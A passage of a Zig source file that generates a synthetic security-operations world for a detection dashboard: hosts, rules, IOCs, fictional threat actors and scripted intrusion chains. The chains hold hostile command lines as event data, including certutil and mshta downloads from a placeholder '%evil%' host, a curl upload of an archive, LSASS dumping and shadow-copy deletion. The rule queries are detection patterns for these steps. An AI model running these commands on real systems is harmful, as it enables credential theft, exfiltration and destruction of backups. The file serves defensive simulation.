@@ -1,0 +1,853 @@
+//! Deterministic mock-world generator: same seed + base timestamp ⇒
+//! byte-identical world. Builds 26 h of telemetry with a diurnal rate
+//! curve plus scripted incident chains (phish → macro → PowerShell → C2
+//! beacon → cred dump → discovery → lateral movement → exfil), derives
+//! alerts by "firing" detection rules against matching events, and links
+//! alert clusters into cases — so Timeline, Process Tree and the Alert
+//! Queue tell coherent stories. `tick()` trickles fresh events so the UI
+//! looks alive.
+
+const std = @import("std");
+const domain = @import("domain");
+const attack = domain.attack;
+const store_mod = @import("store.zig");
+const Store = store_mod.Store;
+
+// ── Name pools (flavor only — indices drive determinism) ────────────────
+
+const host_pool = [_][]const u8{
+    "WS-ACCT-03",  "WS-ACCT-07",  "WS-ENG-11",  "WS-ENG-14",   "WS-ENG-21",
+    "WS-HR-02",    "WS-FIN-05",   "WS-FIN-09",  "WS-EXEC-01",  "WS-IT-04",
+    "WS-SALES-12", "WS-SALES-18", "WS-MKT-06",  "WS-LEGAL-01", "WS-OPS-08",
+    "WS-DEV-15",   "SRV-DC-01",   "SRV-DC-02",  "SRV-FILE-01", "SRV-WEB-01",
+    "SRV-SQL-01",  "SRV-EXCH-01", "SRV-BKP-01", "SRV-VPN-01",
+};
+
+const user_pool = [_][]const u8{
+    "j.smith",   "a.garcia", "m.chen",    "s.patel",   "k.novak",  "t.okafor",
+    "l.johnson", "r.kim",    "d.freeman", "e.watts",   "svc-backup", "svc-web",
+};
+
+const analyst_pool = [_][]const u8{ "cpresley", "nblake", "rvance", "" };
+
+const benign_procs = [_][]const u8{
+    "chrome.exe",   "outlook.exe", "excel.exe",  "winword.exe", "teams.exe",
+    "svchost.exe",  "explorer.exe", "code.exe",  "slack.exe",   "onedrive.exe",
+};
+
+const dns_domains = [_][]const u8{
+    "cdn.office365.com", "update.googleapis.com", "api.slack.com",
+    "github.com",        "crl.microsoft.com",     "telemetry.mozilla.org",
+};
+
+const evil_domains = [_][]const u8{
+    "cdn-metrics-sync.net", "win-svc-update.org", "cloud-report-api.com",
+    "mx1-relay-eu.net",     "static-asset-hub.io",
+};
+
+const feed_names = [_][]const u8{
+    "AbuseCH ThreatFox", "AlienVault OTX", "CISA AIS", "Internal Blocklist",
+    "Emerging Threats",  "VirusTotal Hunting",
+};
+
+const actor_defs = [_]struct {
+    name: []const u8,
+    aliases: []const u8,
+    motivation: domain.Motivation,
+    notes: []const u8,
+}{
+    .{ .name = "MIDNIGHT MANTIS", .aliases = "TA-4471, BronzeVine", .motivation = .espionage, .notes = "Targets engineering + legal. Spearphish with ISO lures, DLL side-loading, long-dwell C2 over HTTPS. Watch for rundll32 spawning from user-writable paths." },
+    .{ .name = "GILDED SPIDER", .aliases = "FIN-88, CarbonWasp", .motivation = .financial, .notes = "Ransomware affiliate. Initial access via exposed RDP + password spraying; rapid encryption within 6h of first beacon. Kills VSS + backup services first." },
+    .{ .name = "CINDER WOLF", .aliases = "APT-C-55", .motivation = .destruction, .notes = "Wiper operations disguised as ransomware. Heavy scheduled-task persistence and event-log clearing." },
+    .{ .name = "HOLLOW SIGNAL", .aliases = "TA-2210, GreyMinnow", .motivation = .financial, .notes = "BEC + mailbox rules. Loves OAuth consent phishing and remote email collection; almost never touches endpoints." },
+    .{ .name = "QUARTZ VEIL", .aliases = "APT-Q, SilentTerrace", .motivation = .espionage, .notes = "Living-off-the-land only: WMI, WinRM, PowerShell without amsi bypass. Exfil to cloud storage in <10 MB chunks." },
+};
+
+/// Detection rule blueprints: name + technique (by string id) + severity +
+/// pseudo-KQL. Noise factor drives fires/FP volumes.
+const rule_defs = [_]struct {
+    name: []const u8,
+    tid: []const u8,
+    sev: domain.Severity,
+    query: []const u8,
+    noisy: bool = false,
+}{
+    .{ .name = "PowerShell EncodedCommand", .tid = "T1059.001", .sev = .high, .query = "proc where name == 'powershell.exe' and cmdline has '-enc'" },
+    .{ .name = "Office spawning shell", .tid = "T1059.003", .sev = .high, .query = "proc where parent in ('winword.exe','excel.exe') and name in ('cmd.exe','powershell.exe')" },
+    .{ .name = "Macro doc launched", .tid = "T1204.002", .sev = .medium, .query = "file where ext == '.docm' and action == 'open'", .noisy = true },
+    .{ .name = "Phishing attachment executed", .tid = "T1566.001", .sev = .high, .query = "proc where parent == 'outlook.exe' and name not in (allowlist)" },
+    .{ .name = "Suspicious link click-through", .tid = "T1566.002", .sev = .medium, .query = "net where referrer == 'mail' and domain.age < 30d", .noisy = true },
+    .{ .name = "Rundll32 no-args launch", .tid = "T1218.011", .sev = .high, .query = "proc where name == 'rundll32.exe' and cmdline.args == 0" },
+    .{ .name = "Mshta remote script", .tid = "T1218.005", .sev = .high, .query = "proc where name == 'mshta.exe' and cmdline has 'http'" },
+    .{ .name = "LSASS memory read", .tid = "T1003.001", .sev = .critical, .query = "proc where target == 'lsass.exe' and access has 'PROCESS_VM_READ'" },
+    .{ .name = "Password spray pattern", .tid = "T1110.003", .sev = .high, .query = "auth where fails > 20 by src over 5m and distinct(user) > 10" },
+    .{ .name = "Kerberoast ticket burst", .tid = "T1558.003", .sev = .high, .query = "auth where ticket == 'TGS' and enc == 'RC4' and count > 8 over 2m" },
+    .{ .name = "Browser cred store access", .tid = "T1555.003", .sev = .medium, .query = "file where path has 'Login Data' and proc != browser", .noisy = true },
+    .{ .name = "Run key persistence", .tid = "T1547.001", .sev = .medium, .query = "reg where key has 'CurrentVersion\\\\Run' and action == 'set'" },
+    .{ .name = "New service install", .tid = "T1543.003", .sev = .medium, .query = "reg where key has 'Services' and action == 'create'", .noisy = true },
+    .{ .name = "Local account created", .tid = "T1136.001", .sev = .high, .query = "proc where name == 'net.exe' and cmdline has 'user /add'" },
+    .{ .name = "DLL side-load from temp", .tid = "T1574.002", .sev = .high, .query = "image where signed == false and path has 'AppData'" },
+    .{ .name = "Web shell write", .tid = "T1505.003", .sev = .critical, .query = "file where path has 'wwwroot' and ext in ('.aspx','.jsp')" },
+    .{ .name = "UAC bypass fodhelper", .tid = "T1548.002", .sev = .high, .query = "reg where key has 'ms-settings' and proc == 'fodhelper.exe'" },
+    .{ .name = "Process injection CreateRemoteThread", .tid = "T1055", .sev = .critical, .query = "proc where api == 'CreateRemoteThread' and target != self" },
+    .{ .name = "Token manipulation", .tid = "T1134", .sev = .high, .query = "proc where api == 'SetThreadToken' and integrity < high" },
+    .{ .name = "Event log cleared", .tid = "T1070.001", .sev = .critical, .query = "log where action == 'clear' and channel == 'Security'" },
+    .{ .name = "Mass file delete", .tid = "T1070.004", .sev = .medium, .query = "file where action == 'delete' and count > 200 over 1m", .noisy = true },
+    .{ .name = "Obfuscated script block", .tid = "T1027", .sev = .medium, .query = "script where entropy > 5.5 and len > 2048", .noisy = true },
+    .{ .name = "Defender tamper attempt", .tid = "T1562.001", .sev = .critical, .query = "reg where key has 'DisableRealtimeMonitoring'" },
+    .{ .name = "Registry policy tamper", .tid = "T1112", .sev = .medium, .query = "reg where key has 'Policies' and proc not in (gpo)" },
+    .{ .name = "Domain account enum", .tid = "T1087.002", .sev = .medium, .query = "proc where name == 'net.exe' and cmdline has 'group \"Domain Admins\"'" },
+    .{ .name = "Remote system discovery", .tid = "T1018", .sev = .low, .query = "proc where name in ('nltest.exe','ping.exe') and count > 15 over 5m", .noisy = true },
+    .{ .name = "Port scan from host", .tid = "T1046", .sev = .medium, .query = "net where distinct(dst_port) > 50 by src over 1m" },
+    .{ .name = "Process listing burst", .tid = "T1057", .sev = .low, .query = "proc where name == 'tasklist.exe' and count > 5 over 10m", .noisy = true },
+    .{ .name = "System info recon", .tid = "T1082", .sev = .low, .query = "proc where name == 'systeminfo.exe'", .noisy = true },
+    .{ .name = "RDP to server segment", .tid = "T1021.001", .sev = .medium, .query = "net where dst_port == 3389 and src in (workstations) and dst in (servers)" },
+    .{ .name = "Admin share mount", .tid = "T1021.002", .sev = .high, .query = "net where share in ('ADMIN$','C$') and user != admin" },
+    .{ .name = "WinRM lateral session", .tid = "T1021.006", .sev = .high, .query = "net where dst_port == 5985 and proc == 'wsmprovhost.exe'" },
+    .{ .name = "PsExec-style service", .tid = "T1570", .sev = .high, .query = "svc where name matches 'PSEXESVC|remcom'" },
+    .{ .name = "Pass-the-hash logon", .tid = "T1550.002", .sev = .critical, .query = "auth where logon_type == 9 and ntlm == true" },
+    .{ .name = "Archive staging", .tid = "T1560.001", .sev = .medium, .query = "proc where name in ('7z.exe','rar.exe') and size > 100MB" },
+    .{ .name = "Screen capture util", .tid = "T1113", .sev = .low, .query = "proc where api == 'BitBlt' and proc not in (allowlist)", .noisy = true },
+    .{ .name = "Mailbox export request", .tid = "T1114.002", .sev = .high, .query = "cloud where op == 'New-MailboxExportRequest'" },
+    .{ .name = "Beacon-like periodicity", .tid = "T1071.001", .sev = .high, .query = "net where jitter(dst) < 5% and interval ~ 60s and dur > 30m" },
+    .{ .name = "DNS tunnel entropy", .tid = "T1071.004", .sev = .high, .query = "dns where subdomain.entropy > 4.2 and qcount > 100 over 10m" },
+    .{ .name = "Rare external proxy chain", .tid = "T1090.003", .sev = .medium, .query = "net where dst in (tor_exit_nodes)" },
+    .{ .name = "Certutil download", .tid = "T1105", .sev = .high, .query = "proc where name == 'certutil.exe' and cmdline has 'urlcache'" },
+    .{ .name = "Exfil over C2", .tid = "T1041", .sev = .critical, .query = "net where bytes_out > 50MB to beacon_dst" },
+    .{ .name = "Cloud storage upload burst", .tid = "T1567.002", .sev = .high, .query = "net where dst in (mega,dropbox,anonfiles) and bytes_out > 100MB" },
+    .{ .name = "VSS deletion", .tid = "T1490", .sev = .critical, .query = "proc where name == 'vssadmin.exe' and cmdline has 'delete shadows'" },
+    .{ .name = "Mass encryption pattern", .tid = "T1486", .sev = .critical, .query = "file where renames > 500 over 2m and ext.new not in (known)" },
+    .{ .name = "Backup service stop", .tid = "T1489", .sev = .high, .query = "svc where action == 'stop' and name in (backup_services)" },
+};
+
+/// One stage of a scripted incident chain.
+const ChainStage = struct {
+    kind: domain.EventKind,
+    proc: []const u8,
+    cmdline: []const u8,
+    tid: []const u8, // attack technique string id
+    sev: domain.Severity,
+    /// Minutes after the previous stage.
+    gap_min: u32,
+    /// Network stages: beacon to an evil domain/ip.
+    evil_net: bool = false,
+};
+
+const chain_phish_ransom = [_]ChainStage{
+    .{ .kind = .process, .proc = "outlook.exe", .cmdline = "OUTLOOK.EXE /recycle", .tid = "T1566.001", .sev = .medium, .gap_min = 0 },
+    .{ .kind = .process, .proc = "winword.exe", .cmdline = "WINWORD.EXE /n \"C:\\Users\\%u\\Downloads\\Invoice_Q3.docm\"", .tid = "T1204.002", .sev = .medium, .gap_min = 1 },
+    .{ .kind = .script, .proc = "powershell.exe", .cmdline = "powershell -nop -w hidden -enc JABzAD0ATgBlAHcALQBP...", .tid = "T1059.001", .sev = .high, .gap_min = 2 },
+    .{ .kind = .network, .proc = "powershell.exe", .cmdline = "beacon 443/tls", .tid = "T1071.001", .sev = .high, .gap_min = 4, .evil_net = true },
+    .{ .kind = .process, .proc = "rundll32.exe", .cmdline = "rundll32.exe C:\\ProgramData\\sync.dll,Start", .tid = "T1218.011", .sev = .high, .gap_min = 22 },
+    .{ .kind = .process, .proc = "procdump64.exe", .cmdline = "procdump64.exe -ma lsass.exe C:\\ProgramData\\ls.dmp", .tid = "T1003.001", .sev = .critical, .gap_min = 35 },
+    .{ .kind = .process, .proc = "net.exe", .cmdline = "net group \"Domain Admins\" /domain", .tid = "T1087.002", .sev = .medium, .gap_min = 41 },
+    .{ .kind = .network, .proc = "System", .cmdline = "SMB ADMIN$ mount", .tid = "T1021.002", .sev = .high, .gap_min = 58 },
+    .{ .kind = .process, .proc = "vssadmin.exe", .cmdline = "vssadmin delete shadows /all /quiet", .tid = "T1490", .sev = .critical, .gap_min = 96 },
+};
+
+const chain_webshell = [_]ChainStage{
+    .{ .kind = .network, .proc = "w3wp.exe", .cmdline = "POST /owa/auth/x.aspx", .tid = "T1190", .sev = .high, .gap_min = 0 },
+    .{ .kind = .file, .proc = "w3wp.exe", .cmdline = "write C:\\inetpub\\wwwroot\\aspnet_client\\supp.aspx", .tid = "T1505.003", .sev = .critical, .gap_min = 1 },
+    .{ .kind = .process, .proc = "cmd.exe", .cmdline = "cmd /c whoami & systeminfo", .tid = "T1082", .sev = .medium, .gap_min = 9 },
+    .{ .kind = .process, .proc = "certutil.exe", .cmdline = "certutil -urlcache -split -f http://%evil%/t.zip", .tid = "T1105", .sev = .high, .gap_min = 15, .evil_net = true },
+    .{ .kind = .network, .proc = "svchost.exe", .cmdline = "beacon 8443/tls", .tid = "T1071.001", .sev = .high, .gap_min = 20, .evil_net = true },
+    .{ .kind = .network, .proc = "rclone.exe", .cmdline = "rclone copy D:\\shares remote:bk", .tid = "T1567.002", .sev = .critical, .gap_min = 170, .evil_net = true },
+};
+
+const chain_spray_lateral = [_]ChainStage{
+    .{ .kind = .auth, .proc = "lsass.exe", .cmdline = "NTLM auth burst: 240 fails / 34 users", .tid = "T1110.003", .sev = .high, .gap_min = 0 },
+    .{ .kind = .auth, .proc = "lsass.exe", .cmdline = "logon type 3 success svc-backup", .tid = "T1078", .sev = .medium, .gap_min = 12 },
+    .{ .kind = .network, .proc = "mstsc.exe", .cmdline = "RDP 3389 -> SRV-FILE-01", .tid = "T1021.001", .sev = .medium, .gap_min = 25 },
+    .{ .kind = .process, .proc = "wsmprovhost.exe", .cmdline = "WinRM Invoke-Command Get-ChildItem", .tid = "T1021.006", .sev = .high, .gap_min = 44 },
+    .{ .kind = .process, .proc = "7z.exe", .cmdline = "7z a -pX c:\\temp\\fin.7z \\\\SRV-FILE-01\\finance", .tid = "T1560.001", .sev = .high, .gap_min = 71 },
+    .{ .kind = .network, .proc = "curl.exe", .cmdline = "PUT https://%evil%/u/fin.7z", .tid = "T1048.003", .sev = .critical, .gap_min = 84, .evil_net = true },
+};
+
+const chain_lotl_espionage = [_]ChainStage{
+    .{ .kind = .process, .proc = "mshta.exe", .cmdline = "mshta https://%evil%/r.hta", .tid = "T1218.005", .sev = .high, .gap_min = 0, .evil_net = true },
+    .{ .kind = .script, .proc = "powershell.exe", .cmdline = "powershell IEX(New-Object Net.WebClient).DownloadString(...)", .tid = "T1059.001", .sev = .high, .gap_min = 3 },
+    .{ .kind = .registry, .proc = "reg.exe", .cmdline = "reg add HKCU\\...\\CurrentVersion\\Run /v Updater", .tid = "T1547.001", .sev = .medium, .gap_min = 8 },
+    .{ .kind = .process, .proc = "wmic.exe", .cmdline = "wmic /node:SRV-SQL-01 process call create", .tid = "T1047", .sev = .high, .gap_min = 33 },
+    .{ .kind = .dns, .proc = "svchost.exe", .cmdline = "TXT queries x400 base32 subdomains", .tid = "T1071.004", .sev = .high, .gap_min = 45, .evil_net = true },
+    .{ .kind = .network, .proc = "svchost.exe", .cmdline = "exfil 38MB over dns tunnel", .tid = "T1041", .sev = .critical, .gap_min = 150, .evil_net = true },
+};
+
+const chains = [_][]const ChainStage{
+    &chain_phish_ransom,
+    &chain_webshell,
+    &chain_spray_lateral,
+    &chain_lotl_espionage,
+};
+
+const chain_case_titles = [_][]const u8{
+    "Ransomware precursor on WS — phish chain",
+    "OWA web shell on SRV-WEB-01",
+    "Password spray → lateral movement → exfil",
+    "LotL espionage — DNS tunnel exfil",
+};
+
+// ── Generator ────────────────────────────────────────────────────────────
+
+pub const WORLD_SPAN_MS: i64 = 26 * std.time.ms_per_hour;
+
+pub const Generator = struct {
+    prng: std.Random.DefaultPrng,
+    seed: u64,
+    /// Wall-clock "now" the world was built against; events span
+    /// [base_ms - WORLD_SPAN_MS, base_ms].
+    base_ms: i64,
+    next_event_id: u64 = 1,
+    next_alert_id: u32 = 1,
+    /// tick() fractional event accumulator.
+    tick_carry: f32 = 0,
+    last_tick_ms: i64 = 0,
+
+    pub fn init(seed: u64, base_ms: i64) Generator {
+        return .{
+            .prng = std.Random.DefaultPrng.init(seed),
+            .seed = seed,
+            .base_ms = base_ms,
+            .last_tick_ms = base_ms,
+        };
+    }
+
+    fn rand(self: *Generator) std.Random {
+        return self.prng.random();
+    }
+
+    /// Technique index by string id; panics on a typo (comptime data bug).
+    fn tidOf(id: []const u8) attack.TechniqueId {
+        for (attack.techniques, 0..) |t, i| {
+            if (std.mem.eql(u8, t.id, id)) return @intCast(i);
+        }
+        unreachable;
+    }
+
+    /// Build the whole world into `store` (cleared first).
+    pub fn build(self: *Generator, store: *Store) !void {
+        store.clear();
+        const alloc = store.allocator;
+
+        // Hosts + users.
+        for (host_pool) |h| try store.hosts.append(alloc, domain.FixedStr(48).from(h));
+        for (user_pool) |u| try store.users.append(alloc, domain.FixedStr(32).from(u));
+
+        // Sensors: EDR fleet coverage + one of each infra kind.
+        const sensor_defs = [_]struct { host: []const u8, kind: domain.SensorKind }{
+            .{ .host = "edr-fleet-ws", .kind = .edr },
+            .{ .host = "edr-fleet-srv", .kind = .edr },
+            .{ .host = "fw-perimeter-01", .kind = .firewall },
+            .{ .host = "fw-dc-01", .kind = .firewall },
+            .{ .host = "ids-span-01", .kind = .ids },
+            .{ .host = "dns-resolver-01", .kind = .dns },
+            .{ .host = "proxy-egress-01", .kind = .proxy },
+            .{ .host = "m365-audit", .kind = .cloud },
+            .{ .host = "aws-cloudtrail", .kind = .cloud },
+            .{ .host = "ids-dmz-01", .kind = .ids },
+        };
+        for (sensor_defs, 0..) |sd, i| {
+            const r = self.rand();
+            const status: domain.SensorStatus = if (i == 8) .degraded else if (i == 9) .down else .ok;
+            try store.sensors.append(alloc, .{
+                .id = @intCast(i),
+                .host = domain.FixedStr(48).from(sd.host),
+                .kind = sd.kind,
+                .status = status,
+                .eps = switch (sd.kind) {
+                    .edr => 120 + r.float(f32) * 260,
+                    .firewall => 800 + r.float(f32) * 900,
+                    .ids => 300 + r.float(f32) * 300,
+                    .dns => 450 + r.float(f32) * 200,
+                    .proxy => 250 + r.float(f32) * 150,
+                    .cloud => 30 + r.float(f32) * 40,
+                },
+                .lag_s = if (status == .down) 9999 else if (status == .degraded) 45 + r.float(f32) * 200 else r.float(f32) * 4,
+                .last_seen_ms = if (status == .down) self.base_ms - 3 * std.time.ms_per_hour else self.base_ms - @as(i64, @intFromFloat(r.float(f32) * 8000)),
+                .version = domain.FixedStr(16).fromFmt("7.{d}.{d}", .{ r.intRangeAtMost(u8, 0, 4), r.intRangeAtMost(u8, 0, 20) }),
+            });
+        }
+
+        // Intel feeds.
+        for (feed_names, 0..) |fname, i| {
+            const r = self.rand();
+            try store.feeds.append(alloc, .{
+                .id = @intCast(i),
+                .name = domain.FixedStr(48).from(fname),
+                .url = domain.FixedStr(96).fromFmt("https://feeds.example.org/{d}/indicators", .{i}),
+                .last_sync_ms = self.base_ms - @as(i64, r.intRangeAtMost(u32, 120_000, 26_000_000)),
+                .status = if (i == 4) .err else .ok,
+            });
+        }
+
+        // Rules: one per blueprint (46) minus a few disabled ones — spread
+        // across tactics by construction.
+        for (rule_defs, 0..) |rd, i| {
+            const r = self.rand();
+            const status: domain.RuleStatus = if (i % 11 == 10) .disabled else if (i % 7 == 6) .testing else .enabled;
+            const fires: u32 = if (rd.noisy) r.intRangeAtMost(u32, 40, 220) else r.intRangeAtMost(u32, 0, 18);
+            const fp: u32 = if (rd.noisy) fires * r.intRangeAtMost(u32, 40, 85) / 100 else fires * r.intRangeAtMost(u32, 0, 30) / 100;
+            try store.rules.append(alloc, .{
+                .id = @intCast(i),
+                .code = domain.FixedStr(8).fromFmt("R-{d:0>4}", .{i + 1}),
+                .name = domain.FixedStr(96).from(rd.name),
+                .status = status,
+                .severity = rd.sev,
+                .technique = tidOf(rd.tid),
+                .fires_7d = fires,
+                .fp_7d = fp,
+                .last_fire_ms = self.base_ms - @as(i64, r.intRangeAtMost(u32, 60_000, 90_000_000)),
+                .author = domain.FixedStr(24).from(analyst_pool[i % 3]),
+                .query = domain.FixedStr(240).from(rd.query),
+            });
+        }
+
+        // IOCs (~600) attributed to feeds.
+        const ioc_total: usize = 600;
+        var ioc_i: usize = 0;
+        while (ioc_i < ioc_total) : (ioc_i += 1) {
+            const r = self.rand();
+            const t: domain.IocType = @enumFromInt(r.intRangeAtMost(u8, 0, 4));
+            const dom_prefixes = [_][]const u8{ "cdn-", "sync-", "api-", "mx-", "update-" };
+            const dom_tlds = [_][]const u8{ "net", "org", "io", "top", "xyz" };
+            const url_paths = [_][]const u8{ "dl/", "u/", "cb/", "t/" };
+            const email_locals = [_][]const u8{ "billing", "invoice", "hr-notice", "it-desk" };
+            const value: domain.FixedStr(128) = switch (t) {
+                .ip => domain.FixedStr(128).fromFmt("{d}.{d}.{d}.{d}", .{ r.intRangeAtMost(u8, 1, 223), r.intRangeAtMost(u8, 0, 255), r.intRangeAtMost(u8, 0, 255), r.intRangeAtMost(u8, 1, 254) }),
+                .domain => domain.FixedStr(128).fromFmt("{s}{d}.{s}", .{ dom_prefixes[r.intRangeAtMost(usize, 0, dom_prefixes.len - 1)], r.intRangeAtMost(u16, 10, 9999), dom_tlds[r.intRangeAtMost(usize, 0, dom_tlds.len - 1)] }),
+                .hash_sha256 => blk: {
+                    var h: domain.FixedStr(128) = .{};
+                    var j: usize = 0;
+                    while (j < 64) : (j += 1) {
+                        h.buf[j] = "0123456789abcdef"[r.intRangeAtMost(usize, 0, 15)];
+                    }
+                    h.len = 64;
+                    break :blk h;
+                },
+                .url => domain.FixedStr(128).fromFmt("https://{s}/{s}{d}", .{ evil_domains[r.intRangeAtMost(usize, 0, evil_domains.len - 1)], url_paths[r.intRangeAtMost(usize, 0, url_paths.len - 1)], r.intRangeAtMost(u16, 100, 9999) }),
+                .email => domain.FixedStr(128).fromFmt("{s}{d}@{s}", .{ email_locals[r.intRangeAtMost(usize, 0, email_locals.len - 1)], r.intRangeAtMost(u16, 1, 99), evil_domains[r.intRangeAtMost(usize, 0, evil_domains.len - 1)] }),
+            };
+            const first = self.base_ms - @as(i64, r.intRangeAtMost(u32, 0, 60)) * std.time.ms_per_day;
+            try store.iocs.append(alloc, .{
+                .id = @intCast(ioc_i + 1),
+                .type = t,
+                .value = value,
+                .confidence = r.intRangeAtMost(u8, 20, 98),
+                .feed = @intCast(r.intRangeAtMost(usize, 0, feed_names.len - 1)),
+                .first_seen_ms = first,
+                .last_seen_ms = first + @as(i64, r.intRangeAtMost(u32, 0, 50)) * std.time.ms_per_hour,
+                .hits = if (r.intRangeAtMost(u8, 0, 9) == 0) r.intRangeAtMost(u32, 1, 12) else 0,
+            });
+        }
+        // Threat actors.
+        for (actor_defs, 0..) |ad, i| {
+            var actor: domain.ThreatActor = .{
+                .id = @intCast(i),
+                .name = domain.FixedStr(48).from(ad.name),
+                .aliases = domain.FixedStr(96).from(ad.aliases),
+                .motivation = ad.motivation,
+                .notes = domain.FixedStr(600).from(ad.notes),
+            };
+            // Tag each actor with the techniques of one chain + extras.
+            const chain = chains[i % chains.len];
+            for (chain) |st| {
+                if (actor.technique_count >= domain.ACTOR_TECHNIQUE_CAP) break;
+                actor.techniques[actor.technique_count] = tidOf(st.tid);
+                actor.technique_count += 1;
+            }
+            try store.actors.append(alloc, actor);
+        }
+
+        // ── Events: 26 h background noise + scripted chains ──────────────
+        try self.buildBackgroundEvents(store);
+        try self.buildChains(store);
+        // Sort by timestamp so panels can binary-search ranges; then re-id
+        // in ts order so eventById's binary search stays valid.
+        std.mem.sort(domain.Event, store.events.items, {}, struct {
+            fn less(_: void, a: domain.Event, b: domain.Event) bool {
+                if (a.ts_ms != b.ts_ms) return a.ts_ms < b.ts_ms;
+                return a.id < b.id;
+            }
+        }.less);
+        // Remap ids to sorted order, preserving parent links.
+        {
+            var id_map = std.AutoHashMap(u64, u64).init(alloc);
+            defer id_map.deinit();
+            for (store.events.items, 0..) |*e, i| {
+                try id_map.put(e.id, @intCast(i + 1));
+            }
+            for (store.events.items, 0..) |*e, i| {
+                e.id = @intCast(i + 1);
+                if (e.parent) |p| e.parent = id_map.get(p);
+            }
+            self.next_event_id = store.events.items.len + 1;
+        }
+
+        // Chain beacon destinations become high-confidence ip IOCs so the
+        // NET panel's IOC-match column has real hits.
+        for (store.events.items) |*e| {
+            if (e.technique == null or e.dst_ip.len == 0) continue;
+            if (e.kind != .network and e.kind != .dns) continue;
+            var known = false;
+            for (store.iocs.items) |*ic| {
+                if (ic.type == .ip and std.mem.eql(u8, ic.value.slice(), e.dst_ip.slice())) {
+                    ic.hits += 1;
+                    ic.last_seen_ms = @max(ic.last_seen_ms, e.ts_ms);
+                    known = true;
+                    break;
+                }
+            }
+            if (!known) {
+                try store.iocs.append(alloc, .{
+                    .id = @intCast(store.iocs.items.len + 1),
+                    .type = .ip,
+                    .value = domain.FixedStr(128).from(e.dst_ip.slice()),
+                    .confidence = 92,
+                    .feed = 3, // Internal Blocklist
+                    .first_seen_ms = e.ts_ms,
+                    .last_seen_ms = e.ts_ms,
+                    .hits = 1,
+                });
+            }
+        }
+
+        // Feed ioc_count = actual attribution counts.
+        for (store.feeds.items) |*f| {
+            var n: u32 = 0;
+            for (store.iocs.items) |*ic| {
+                if (ic.feed == f.id) n += 1;
+            }
+            f.ioc_count = n;
+        }
+
+        // ── Alerts: fire rules against technique-tagged events ───────────
+        try self.buildAlerts(store);
+
+        // ── Cases: one per chain + misc clusters ─────────────────────────
+        try self.buildCases(store);
+
+        store.touch();
+    }
+
+    /// Diurnal weight for an hour-of-day (0..23): office-hours hump.
+    fn diurnal(hour: f32) f32 {
+        const d = (hour - 14.0);
+        return 0.30 + 0.70 * @exp(-(d * d) / 16.0);
+    }
+
+    fn buildBackgroundEvents(self: *Generator, store: *Store) !void {
+        const alloc = store.allocator;
+        const start = self.base_ms - WORLD_SPAN_MS;
+        // ~2600 background events across 26 h, diurnally weighted.
+        const slots: usize = 26 * 6; // 10-minute buckets
+        const per_bucket_base: f32 = 2600.0 / @as(f32, @floatFromInt(slots));
+        var b: usize = 0;
+        while (b < slots) : (b += 1) {
+            const bucket_start = start + @as(i64, @intCast(b)) * 10 * std.time.ms_per_min;
+            const hour_of_day = @as(f32, @floatFromInt(@mod(@divFloor(bucket_start, std.time.ms_per_hour), 24)));
+            // The diurnal curve averages ~0.51 over a day — the 2.0 factor
+            // rescales so the 26 h total lands near the 2600 target.
+            const want = per_bucket_base * diurnal(hour_of_day) * 2.0;
+            var n: usize = @intFromFloat(want);
+            const r0 = self.rand();
+            if (r0.float(f32) < (want - @as(f32, @floatFromInt(n)))) n += 1;
+            var i: usize = 0;
+            while (i < n) : (i += 1) {
+                const ts = bucket_start + @as(i64, self.rand().intRangeAtMost(u32, 0, 10 * std.time.ms_per_min - 1));
+                try store.events.append(alloc, self.benignEvent(store, ts));
+            }
+        }
+    }
+
+    fn benignEvent(self: *Generator, store: *Store, ts: i64) domain.Event {
+        const r = self.rand();
+        const kind: domain.EventKind = @enumFromInt(r.weightedIndex(u16, &.{ 34, 22, 14, 12, 10, 4, 4 }));
+        const host: u16 = @intCast(r.intRangeAtMost(usize, 0, store.hosts.items.len - 1));
+        const user: u16 = @intCast(r.intRangeAtMost(usize, 0, store.users.items.len - 1));
+        var e: domain.Event = .{
+            .id = self.next_event_id,
+            .ts_ms = ts,
+            .kind = kind,
+            .host = host,
+            .user = user,
+            .sensor = switch (kind) {
+                .process, .file, .registry, .script => @as(u16, if (host >= 16) 1 else 0),
+                .network => 2,
+                .auth => 0,
+                .dns => 5,
+            },
+        };
+        self.next_event_id += 1;
+        switch (kind) {
+            .process, .script => {
+                const p = benign_procs[r.intRangeAtMost(usize, 0, benign_procs.len - 1)];
+                e.process = domain.FixedStr(64).from(p);
+                e.cmdline = domain.FixedStr(160).fromFmt("{s} --type=renderer --lang=en-US", .{p});
+            },
+            .network => {
+                e.process = domain.FixedStr(64).from(benign_procs[r.intRangeAtMost(usize, 0, benign_procs.len - 1)]);
+                e.dst_ip = domain.FixedStr(46).fromFmt("172.16.{d}.{d}", .{ r.intRangeAtMost(u8, 0, 31), r.intRangeAtMost(u8, 1, 254) });
+                const common_ports = [_]u16{ 443, 443, 443, 80, 8080, 445, 53 };
+                e.dst_port = common_ports[r.intRangeAtMost(usize, 0, common_ports.len - 1)];
+                e.cmdline = domain.FixedStr(160).fromFmt("tls session {d}s {d}KB", .{ r.intRangeAtMost(u16, 1, 900), r.intRangeAtMost(u16, 1, 4096) });
+            },
+            .auth => {
+                e.process = domain.FixedStr(64).from("lsass.exe");
+                const t4: u8 = r.intRangeAtMost(u8, 2, 3);
+                e.cmdline = domain.FixedStr(160).fromFmt("logon type {d} success", .{t4});
+            },
+            .file => {
+                e.process = domain.FixedStr(64).from(benign_procs[r.intRangeAtMost(usize, 0, benign_procs.len - 1)]);
+                e.cmdline = domain.FixedStr(160).fromFmt("write C:\\Users\\{s}\\Documents\\doc{d}.xlsx", .{ store.userName(user), r.intRangeAtMost(u16, 1, 400) });
+            },
+            .dns => {
+                e.process = domain.FixedStr(64).from("svchost.exe");
+                e.cmdline = domain.FixedStr(160).fromFmt("query A {s}", .{dns_domains[r.intRangeAtMost(usize, 0, dns_domains.len - 1)]});
+                e.dst_port = 53;
+            },
+            .registry => {
+                e.process = domain.FixedStr(64).from("svchost.exe");
+                e.cmdline = domain.FixedStr(160).from("set HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer");
+            },
+        }
+        return e;
+    }
+
+    fn buildChains(self: *Generator, store: *Store) !void {
+        const alloc = store.allocator;
+        for (chains, 0..) |chain, ci| {
+            const r = self.rand();
+            // Chain start: 3–20 h ago so every chain is inside the window.
+            const start = self.base_ms - @as(i64, r.intRangeAtMost(u32, 3 * 60, 20 * 60)) * std.time.ms_per_min;
+            const host: u16 = if (ci == 1) 19 else @intCast(r.intRangeAtMost(usize, 0, 15)); // web shell on SRV-WEB-01
